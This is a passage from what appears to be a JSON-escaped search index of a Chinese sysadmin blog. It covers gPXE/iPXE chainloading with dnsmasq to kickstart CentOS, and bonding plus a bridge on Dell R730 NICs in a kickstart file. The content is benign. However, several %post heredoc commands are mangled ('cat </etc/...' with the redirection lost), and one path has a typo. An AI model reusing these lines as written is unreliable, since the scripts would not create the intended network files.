之所以不再使用gPXE是由于存在版权纠纷，iPXE从2010年4月开始，基于同一个代码库开始开发。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePXELINUX\nSyslinux是一个优秀的系统启动加载器(bootloader)，可引导自硬盘、光盘、和通过PXE的网络启动。  PXELINUX派生自Syslinux，用来使支持PXE的网卡从网络引导启动Linux。PXELINUX程序不是烧在网卡里，而是存储在TFTP服务器上。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eChainloading iPXE\n可以把iPXE当作固件刷进计算机网卡的ROM里替换掉自带的PXE，但更为常见的是通过chainloading的方式进入iPXE。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e有点晕是吧，总结一下，pxe包含了gpxe/ipxe/pxelinux，ipxe是最新的，gpxe/ipxe/pxelinux可以通过chain的方式顶替网卡原生的pxe。\u003c/p\u003e\n\u003cp\u003e推荐的装机方式：\u003c/p\u003e\n\u003cp\u003e客户机启动网卡自带的固件pxe，然后去服务器拉一个gpxe/ipxe，然后启动这个gpxe/ipxe，再去服务器拉具体的启动文件，这种就是chain方式了。我们就可以用到http/iscsi/wifi等各种先进方式启动了。\u003c/p\u003e\n\u003cp\u003e我们第一步先要准备一个gpxe的boot文件。\u003c/p\u003e\n\u003cp\u003e解释一下，文件后缀有.pxe/.kpxe/.kkpxe，这是个递进关系，.pxe是最原生的网卡驱动，.kpxe包含了调用原生网卡的UNDI驱动(无网卡驱动），.kkpxe更进一步，包含了UNDI+PXE原生网卡的驱动。\u003c/p\u003e\n\u003cp\u003e当然选择.kpxe了，我们的目的就是通过这个ipxe调用原生网卡上的驱动即可，如果是你自己要烧网卡的bootroom片子，就得选择所有驱动了。\u003c/p\u003e\n\u003cp\u003e这样我们会得到一个 gpxe-1.0.1-undionly.kpxe 的文件，保存备用。\u003c/p\u003e\n\u003cp\u003e然后我们来设置Dnsmasq:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog-dhcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-no-override\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenable-tftp  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etftp-root \u003cspan class=\"o\"\u003e=\u003c/span\u003e /tftpboot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-range\u003cspan class=\"o\"\u003e=\u003c/span\u003etftp,172.16.36.100,172.16.36.105\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-match\u003cspan class=\"o\"\u003e=\u003c/span\u003egpxe,175  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003enet:#gpxe,gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://172.16.8.1/ks/boot.txt  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：gpxe-1.0.1-undionly.kpxe是放在/tftpboot/gpxe/之下的\u003c/p\u003e\n\u003cp\u003e上面有很多玄机，dhcp-range是随便设一个地址池，因为最终实际是gpxe来决定地址，所以第一次dhcp得到的地址反而不重要了。dhcp-no-override一定要有，否则gpxe有bug，无法启动。\u003c/p\u003e\n\u003cp\u003e其次匹配gpxe，凡是175的都是gpxe，为什么要匹配呢？看下面，有两个dhcp-boot启动选项，#pxe，#表示不是，这行意思是:不是gpxe启动的话用/tftp/gpxe/gpxe-1.0.1-undionly.kpxe来启动，dhcp的server是172.16.36.1。第二行如果是gpxe启动的话，就chain到[http://172.16.8.1/ks/boot.txt]去启动\u003c/p\u003e\n\u003cp\u003e呵呵，如果不这么设置，就用一行的话：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp-boot\u003cspan class=\"o\"\u003e=\u003c/span\u003egpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e就会陷入死循环，首先pxe启动，抓了个gpxe，gpxe又启动抓了个gpxe，又抓gpxe，循环往复没玩没了。所以必须标记gpxe，并跳出这个循环。\u003c/p\u003e\n\u003cp\u003e我们在172.16.8.1上面建立/centos7的yum安装源，同时建立/ks目录。准备boot.txt，boot2.php，boot3.php，centos7.ks四个文件，下面一个一个解释：\u003c/p\u003e\n\u003cp\u003e首先是boot.txt\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat boot.txt  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!gpxe\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echain http://172.16.8.1/ks/boot2.php?uuid\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003euuid\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003emac\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003emac\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ebusid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003ebusid\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eip\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003eip\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ehostname\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003ehostname:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eserial\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003eserial:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003easset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003easset:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003emanufacturer\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003emanufacturer:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eproduct\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\$\u003c/span\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003eproduct:uristring\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e大家看上面，boot.txt是个gpxe脚本，实际是让gpxe向boot2.php传输了一些数据过来，有机器的uuid/mac/busid/hostname/serial/product等等。给个具体的例子，从access.log看到实际发过来的请求如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;GET /ks/boot2.php?uuid=%5C44454c4c-5600-1054-8042-b1c04f433532\u0026amp;mac=%5Cec%3Af4%3Abb%3Ad9%3A96%3A40\u0026amp;busid=%5C01%3A80%3A86%3A15%3A21\u0026amp;ip=%5C172.16.36.100\u0026amp;hostname=%5C\u0026amp;serial=%5C1VTBC52\u0026amp;asset=%5C\u0026amp;manufacturer=%5CDell%20Inc.\u0026amp;product=%5CPowerEdge%20R730 HTTP/1.0\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"m\"\u003e46\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;gPXE/1.0.1\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;-\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看上面，有很多信息，网卡的物理地址，还有serial，对应dell就是svc tag号，还有机器类别PowerEdge R730，这是个好东西啊。\u003c/p\u003e\n\u003cp\u003e我们购买机器的时候肯定有序列号，上架到机房的时候，可以让idc抄下来机柜和序列号，然后我们让网管规划好ip，再这里就可以利用serial来确定机器应该按哪个模板安装。\u003c/p\u003e","title":"IPXE kickstart安装CentOS的方法"},{"content":"如何在kickstart脚本中既配置br，又配置bonding呢？\n基本篇： 以Dell R730为例，物理网卡名称是em1/em2/em3/em4\nnetwork --device=br0 --noipv6 --onboot=yes --bridgeslaves=bond0 --gateway=172.16.37.254 --ip=172.16.36.2 --nameserver=172.16.8.1 --netmask=255.255.254.0 --activate network --device=bond0 --noipv6 --onboot=yes --bondslaves=em1,em2 --bondopts=mode=active-backup,balance-rr;primary=em1,miimon=80,updelay=60000 --activate network --device=em1 --noipv6 --nodns --onboot=yes --activate network --device=em2 --noipv6 --nodns --onboot=yes --activate network --device=em3 --noipv6 --nodns --onboot=yes --activate network --device=em4 --noipv6 --nodns --onboot=yes --activate network --hostname=myhost-16-36-2 注意以上，是只做了 em1 和 em2 绑定成为 bond0 ，然后 br0 启动在 bond0 之上。\n进阶篇： 基本篇的做法固然是做了四网卡绑定和桥接，副作用也是很可怕的。\n大家去看/etc/sysconfig/network-scripts， 里面有一堆的ifcfg-br0-slave_1，ifcfg-bond0-slave_1， ifcfg-bond0-slave_2，更可恶的是进程中跑着好几个dhcp-client，一想就明白了，这是NetworkManager搞得。em3和em4不断去启停端口，试图获得地址，导致交换机端口忽断忽通。\n这个试图自动化网络的东西在服务器跑上实在是太无聊了。\n所以上面的做法摒弃。在%post把网络搞好：\n... %packages @compat-libraries @core wget net-tools chrony bridge-utils %end ... network --bootproto=static --device=em1 --noipv6 --nodns --onboot=yes --gateway=172.16.37.254 --ip=172.16.36.2 --nameserver=172.16.8.1 --netmask=255.255.254.0 network --bootproto=dhcp --device=em2 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em3 --noipv6 --nodns --onboot=no network --bootproto=dhcp --device=em4 --noipv6 --nodns --onboot=no network --hostname=myhost-16-36-2 ... %post yum -y erase NetworkManager cat \u0026lt;/etc/sysconfig/network-scripts/ifcfg-br0 DEVICE=br0 TYPE=Bridge BOOTPROTO=static ONBOOT=yes IPADDR=172.16.36.2 NETMASK=255.255.254.0 GATEWAY=172.16.37.254 EOF cat \u0026lt; /etc/modprobe.d/bonding.conf alias bond0 bonding BONDING_OPTS=\u0026#34;miimon=100 mode=1 primary=em1\u0026#34; EOF cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-bond0 DEVICE=bond0 ONBOOT=yes USERCTL=no BRIDGE=br0 EOF cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em1 DEVICE=em1 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em2 DEVICE=em2 USERCTL=no ONBOOT=yes MASTER=bond0 SLAVE=yes BRIDGE=\u0026#34;br0\u0026#34; EOF %end 注意上面，安装包必须安装bridge-utils，否则没有brctl，无法启动br0。\n其次是卸载了NetworkManager，服务器网络都是手动配的，没人用自动化管理。\n这样就完美了。\n","permalink":"https://rendoumi.com/posts/20240118-kickstart_bongding/","summary":"\u003cp\u003e如何在\u003ccode\u003ekickstart\u003c/code\u003e脚本中既配置br，又配置bonding呢？\u003c/p\u003e\n\u003ch2 id=\"基本篇\"\u003e基本篇：\u003c/h2\u003e\n\u003cp\u003e以Dell R730为例，物理网卡名称是em1/em2/em3/em4\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --device\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0   --noipv6  --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --bridgeslaves\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 --gateway\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.37.254 --ip\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.36.2 --nameserver\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.8.1 --netmask\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.254.0 --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --device\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 --noipv6  --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --bondslaves\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1,em2 --bondopts\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003emode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eactive-backup,balance-rr\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eprimary\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1,miimon\u003cspan class=\"o\"\u003e=\u003c/span\u003e80,updelay\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e60000\u003c/span\u003e --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem2 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem3 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem4 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --activate  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --hostname\u003cspan class=\"o\"\u003e=\u003c/span\u003emyhost-16-36-2  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意以上，是只做了 em1 和 em2 绑定成为 bond0 ，然后 br0 启动在 bond0 之上。\u003c/p\u003e\n\u003ch2 id=\"进阶篇\"\u003e进阶篇：\u003c/h2\u003e\n\u003cp\u003e基本篇的做法固然是做了四网卡绑定和桥接，副作用也是很可怕的。\u003c/p\u003e\n\u003cp\u003e大家去看/etc/sysconfig/network-scripts， 里面有一堆的ifcfg-br0-slave_1，ifcfg-bond0-slave_1， ifcfg-bond0-slave_2，更可恶的是进程中跑着好几个dhcp-client，一想就明白了，这是NetworkManager搞得。em3和em4不断去启停端口，试图获得地址，导致交换机端口忽断忽通。\u003c/p\u003e\n\u003cp\u003e这个试图自动化网络的东西在服务器跑上实在是太无聊了。\u003c/p\u003e\n\u003cp\u003e所以上面的做法摒弃。在%post把网络搞好：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e... \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%packages \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@compat-libraries \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e@core \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet-tools \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echrony \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebridge-utils \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%end \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003estatic --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1 --noipv6 --nodns  --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes --gateway\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.37.254 --ip\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.36.2  --nameserver\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.8.1 --netmask\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.254.0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003edhcp --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem2 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003edhcp --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem3 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --bootproto\u003cspan class=\"o\"\u003e=\u003c/span\u003edhcp --device\u003cspan class=\"o\"\u003e=\u003c/span\u003eem4 --noipv6 --nodns --onboot\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetwork  --hostname\u003cspan class=\"o\"\u003e=\u003c/span\u003emyhost-16-36-2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%post \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e yum -y erase NetworkManager \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt;/etc/sysconfig/network-scripts/ifcfg-br0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eTYPE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eBridge \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBOOTPROTO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003estatic \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eIPADDR\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.36.2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eNETMASK\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e255.255.254.0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eGATEWAY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e172.16.37.254 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/modprobe.d/bonding.conf \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e bond0 bonding \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBONDING_OPTS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;miimon=100 mode=1 primary=em1\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-bond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em1 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem1 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eMASTER\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eSLAVE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;br0\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e cat \u0026lt; /etc/sysconfig/network-scripts/ifcfg-em2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eDEVICE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eem2 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eUSERCTL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eONBOOT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eMASTER\u003c/span\u003e\u003cspan 